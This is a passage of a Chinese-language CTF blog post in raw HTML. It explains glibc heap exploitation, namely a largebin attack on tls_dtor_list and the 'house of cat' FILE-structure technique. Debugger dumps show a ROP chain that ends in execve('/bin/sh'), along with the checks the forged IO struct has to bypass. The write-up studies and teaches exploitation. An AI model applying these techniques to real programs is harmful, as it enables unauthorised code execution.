class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52330</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x00005572d1a53c10</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52340</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x0000000000000841</span>\t\t\t\t<span class=\"comment\">//原本为0x421</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52350</span>:\t<span class=\"number\">0x00007fa2a9bbace0</span>\t<span class=\"number\">0x00007fa2a9bbace0</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52360</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>重新申请第一个 chunk 区域，第二个 chunk 的数据就会被更改了。</p>\n<p>我们就完成了 libc 的泄露，下面就是堆 heap 地址的泄露，只要有了 overlap 我们就完成了两地址的泄露 ，这里不在细说。</p>\n<p>接下来就是利用 largebinattack 攻击，首先修改 tls_dtor_list 的值为一个我们可控制的 chunk 地址。然后修改 secret 为已知可控地址。secret 是 tcache,fastbin 加密 key。</p>\n<p>tls_dtor_list 结构体的为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(<span class=\"keyword\">struct</span> dtor_list *) <span class=\"number\">0x563bed37d920</span></span><br><span class=\"line\">$<span class=\"number\">8</span> = &#123;</span><br><span class=\"line\">  func = <span class=\"number\">0x525a0543f9580000</span>,</span><br><span class=\"line\">  obj = <span class=\"number\">0x7f16ef9363e5</span> &lt;iconv+<span class=\"number\">197</span>&gt;,</span><br><span class=\"line\">  <span class=\"built_in\">map</span> = <span class=\"number\">0x7f16efae4698</span>,</span><br><span class=\"line\">  next = <span class=\"number\">0x7f16ef937e51</span> &lt;__gconv_close_transform+<span class=\"number\">225</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">+++++++++++++++++++++++</span><br><span class=\"line\">pwndbg&gt; tel <span class=\"number\">0x563bed37d920</span> <span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│  <span class=\"number\">0x563bed37d920</span> ◂— <span class=\"number\">0x525a0543f9580000</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│  <span class=\"number\">0x563bed37d928</span> —▸ <span class=\"number\">0x7f16ef9363e5</span> (iconv+<span class=\"number\">197</span>) ◂— pop    rdi</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│  <span class=\"number\">0x563bed37d930</span> —▸ <span class=\"number\">0x7f16efae4698</span> ◂— <span class=\"number\">0x68732f6e69622f</span> <span class=\"comment\">/* &#x27;/bin/sh&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│  <span class=\"number\">0x563bed37d938</span> —▸ <span class=\"number\">0x7f16ef937e51</span> (__gconv_close_transform+<span class=\"number\">225</span>) ◂— pop    rsi</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0x563bed37d940</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│  <span class=\"number\">0x563bed37d948</span> —▸ <span class=\"number\">0x7f16efa2b497</span> (qecvt+<span class=\"number\">39</span>) ◂— pop    rdx</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│  <span class=\"number\">0x563bed37d950</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│  <span class=\"number\">0x563bed37d958</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0040</span>│  <span class=\"number\">0x563bed37d960</span> —▸ <span class=\"number\">0x7f16ef9f70f0</span> (execve) ◂— endbr64</span><br></pre></td></tr></table></figure>\n<p>总结下，这里。00 的位置，其实是任意代码执行的，除了可以写 leave，但是貌似这里的写法已经很直接，所以我们无需再更改，如有需要可以写为 orw.secret 其实是否需要改写，是根据是否可以泄露出 secret 而定，如果可以，就不需要改写，一些攻击即可。</p>\n<p>我们修改 tls_dtor_list 为一个堆头地址，我们还要将这个头部改写，因为任意代码执行就是这个直接地址开始的。</p>\n<p>关于 largebinattack，如果 bin 只有一个 free_chunk，我们攻击的话，只需要修改其 bk_nextsize。</p>\n<p>同时，我们也可以进行多次攻击，只要是 size 比第一个小，就会进行前插，但是这次不是修改第一个头的 bk_next, 而是第一次那个。就是说在同一个位置修改，其他尽量保持不变。</p>\n<p>关键就在与修改 tls_dtor_list，开始这里是空的，将其指向一个 chunk, 并且完全控制这里，在这里构造一个 leave ret 加上 rop，注意的是 leaveret 的地址要进行加密。</p>\n<h2 id=\"house-of-cat\"><a class=\"markdownIt-Anchor\" href=\"#house-of-cat\">#</a> house of cat</h2>\n<p>这是一个比较新的路径，是 catF1y 师傅挖出来的一条链子，并且在强网杯初赛部署了同名题目。但是，就在比赛前夕，以为师傅连更两条博客，house of apple2 以及 house of apple3，导致了题目被非预期。同时，我们也尝试了使用 house of emma，成功非预期。这里就先开始预期解的 house of cat 的学习记录。</p>\n<p>高版本的 glibc 就是对 io 的疯狂脑洞输出。house of cat 也是一个有关 io 的利用路径。</p>\n<h3 id=\"利用条件\"><a class=\"markdownIt-Anchor\" href=\"#利用条件\">#</a> 利用条件</h3>\n<ul>\n<li>1. 能够任意地址写一个可控堆地址。</li>\n<li>2. 能够泄露堆地址和 libc 基址。</li>\n<li>3. 能够触发 IO 流（FSOP 或触发__malloc_assert），执行 IO 相关函数。</li>\n</ul>\n<p>其实从这里我们看出，这里的利用条件与其他的一些手法极为相似，基本就是利用 exit () 函数退出的一些操作。随着版本的迭代，glibc 对于虚表的保护也是不断的更新，首先就是对于 io_file_jump 的检查，包括但不限于禁止直接修改虚表内容、检查虚表地址是否合法（在规定的虚表地址范围内）。其实之前我们讲过利用 io_str_jump 的虚表绕过检查，但是当时的方法的弊端就是两个函数_IO_str_overflow 以及_IO_str_finish 的相关漏洞被封死。</p>\n<p>这里作者利用了一个新的 io 虚表结构体_IO_wfile_jumps，然后下面的操作与_IO_str_jumps 非常相似，甚至函数名字都很相似</p>\n<p>这里我先介绍下目标函数是如何实现然亦函数调用的，</p>\n<p>结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_wfile_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class=\"line\">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class=\"line\">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class=\"line\">  JUMP_INIT(read, _IO_file_read),</span><br><span class=\"line\">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class=\"line\">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class=\"line\">  JUMP_INIT(close, _IO_file_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>原理，利用程序报错__malloc_asset 报错调用 xsputn, 替换该虚表函数为 _IO_wfile_seekfoff</p>\n<p>FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>\n<p>其中的函数（_IO_wfile_seekoff）的内部结构为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class=\"type\">off64_t</span> offset, <span class=\"type\">int</span> dir, <span class=\"type\">int</span> mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> result;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> delta, new_offset;</span><br><span class=\"line\">  <span class=\"type\">long</span> <span class=\"type\">int</span> count;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (mode == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> do_ftell_wide (fp);</span><br><span class=\"line\">  <span class=\"type\">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class=\"line\">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class=\"line\">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class=\"line\">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class=\"line\">#需要绕过was_writing的检测</span><br><span class=\"line\">  <span class=\"type\">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">              || _IO_in_put_mode (fp));</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果 mode!=0 且 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 会调用_IO_switch_to_wget_mode 这个函数，继续跟进代码。虽然说这里要求的是 mode 值不为零，但是在最开始伪造的时候，mode 设置却还是 0，不过调试的时候，发现这里可能会发生变化，从我们传入的 0 变为了 - 1。经过测试，最开始也可以将 mode 设置为 1 ，后面触发__malloc_assert,mode 不会被更改。（这条仅在 house of cat 同名题目测试）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">  ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而_IO_WOVERFLOW 是 glibc 里定义的一个宏调用函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>\n<p>可以看到对_IO_WOVERFLOW 没有进行任何检测，为了便于理解，我们再来看看汇编代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class=\"line\"> 0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class=\"line\"> 0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class=\"line\"> 0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class=\"line\"> 0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class=\"line\"> 0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class=\"line\"> 0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> 0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class=\"line\"> 0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class=\"line\"> 0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>\n<p>在造成任意地址写一个堆地址的基础上，这里的寄存器 rdi（fake_IO 的地址）、rax 和 rdx 都是我们可以控制的，</p>\n<p>rdi 是我们伪造的 io_file 的地址，我们将 rax 控制为堆上的一个地址，就可以实现任意函数的调用。</p>\n<p>这里还要补习一下 setcontext 的知识</p>\n<p>在开启沙箱的情况下，假如把最后调用的 [rax + 0x18] 设置为 setcontext，把 rdx 设置为可控的堆地址，就能执行 srop 来读取 flag；如果未开启沙箱，则只需把最后调用的 [rax + 0x18] 设置为 system 函数，把 fake_IO 的头部写入 /bin/sh 字符串，就可执行 system (&quot;/bin/sh&quot;)</p>\n<p>fake_IO 结构体需要绕过的检测</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class=\"line\">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class=\"line\">#如果_wide_data=fake_io_addr+<span class=\"number\">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class=\"line\">fp``-``&gt;_lock是一个可写地址</span><br><span class=\"line\">fp``-``&gt;_mode ``=` `<span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>大致的攻击流程</p>\n<ol>\n<li>修改_IO_list_all 为可控地址（FSOP）或修改 stderr 为可控地址 (__malloc_assert)。</li>\n<li>在上一步的可控地址中伪造 fake_IO 结构体。</li>\n<li>通过 FSOP 或 malloc 触发攻击。</li>\n</ol>\n<p>但是当我进行到这里的时候，我发现不能独立正常的复现，因为作者的文章并没有给出这条完整利用链。</p>\n<h3 id=\"问题\"><a class=\"markdownIt-Anchor\" href=\"#问题\">#</a> 问题</h3>\n<ul>\n<li>完整的利用链是从哪里触发， 完整的函数调用链是怎么样的？</li>\n<li>作者提出了两个不同的流程，一个是进行 FSOP，利用的是_IO_flush_all_lockp 函数来刷新所有的 IO 流。也就是说最后是进入 flush 函数，进行一系列的调用，对应的就是虚表中的_IO_overflow. 但是_IO_flush_all_lockp 触发的前提应该是能执行 exit (显式调用、libc 调用 abort、以及 main 函数正常退出)</li>\n<li>另外一个思路是利用利用__malloc_assert 触发的报错。会使用 stderr 进行一个报错输出</li>\n</ul>\n<p>以上，house of cat 的关键点是 JUMP_INIT (seekoff, _IO_wfile_seekoff), 顺利的进入后又会执行 _IO_switch_to_wget_mode (fp)，最大的问题就是如何进入这里 _IO_wfile_seekoff?</p>\n<p>以下为个人的分析过程</p>\n<p>我们要知道这里代替了谁。函数的入口在于 IO 函数初始化后调用谁的问题，因为我们是对 vtable 进行了偏移替换，所以我们将二者进行一个对比。</p>\n<p>修改前的 IO_list_all 的对应</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f56882ae680</span> &lt;_IO_list_all&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f56882ae680</span> </span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f56882ae6a0</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f56882ae6a0</span> </span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72540025</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f56882ae724</span> &lt;_IO_2_1_stderr_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x7f56882ae780</span> &lt;_IO_2_1_stdout_&gt;,</span><br><span class=\"line\">    _fileno = <span class=\"number\">2</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">-1</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f56882afa60</span> &lt;_IO_stdfile_2_lock&gt;,</span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f56882ad8a0</span> &lt;_IO_wide_data_2&gt;,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f56882aa600</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p _IO_file_jumps</span><br><span class=\"line\">$<span class=\"number\">4</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x7f5688120070</span> &lt;_IO_new_file_finish&gt;,</span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7f5688120e40</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class=\"line\">  __underflow = <span class=\"number\">0x7f5688120b30</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class=\"line\">  __uflow = <span class=\"number\">0x7f5688121de0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x7f5688123300</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x7f568811f680</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x7f568811f330</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x7f568811e960</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x7f5688122530</span> &lt;_IO_default_seekpos&gt;,</span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x7f568811e620</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class=\"line\">  __sync = <span class=\"number\">0x7f568811e4b0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x7f5688112b90</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class=\"line\">  __read = <span class=\"number\">0x7f568811f9b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class=\"line\">  __write = <span class=\"number\">0x7f568811ef40</span> &lt;_IO_new_file_write&gt;,</span><br><span class=\"line\">  __seek = <span class=\"number\">0x7f568811e6f0</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class=\"line\">  __close = <span class=\"number\">0x7f568811e610</span> &lt;__GI__IO_file_close&gt;,</span><br><span class=\"line\">  __stat = <span class=\"number\">0x7f568811ef30</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x7f56881234a0</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class=\"line\">  __imbue = <span class=\"number\">0x7f56881234b0</span> &lt;_IO_default_imbue&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改后 (地址不一样，看偏移)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span 